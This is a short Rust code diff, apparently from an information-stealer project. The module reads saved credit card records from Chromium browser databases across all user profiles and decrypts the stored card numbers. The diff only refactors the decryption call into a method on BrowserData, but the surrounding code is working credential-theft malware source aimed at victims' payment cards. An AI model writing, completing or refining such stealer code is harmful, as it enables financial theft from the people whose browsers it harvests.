@@ -1,5 +1,5 @@
 use crate::alloc::borrow::ToOwned;
-use crate::chromium::{decrypt_data, BrowserData};
+use crate::chromium::BrowserData;
 use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, CreditCard};
 use alloc::sync::Arc;
 use database::TableRecord;
@@ -49,7 +49,7 @@ fn extract_card_from_record(record: &dyn TableRecord, browser_data: &BrowserData
     let use_count = record.get_value(CREDIT_CARDS_USE_COUNT)?.as_integer()?;
     
     let encrypted_card_number = record.get_value(CREDIT_CARDS_CARD_NUMBER)?.as_blob()?;
-    let card_number = unsafe { decrypt_data(encrypted_card_number, browser_data) }?;
+    let card_number = unsafe { browser_data.decrypt_data(encrypted_card_number) }?;
     
     Some(CreditCard {
         name_on_card,
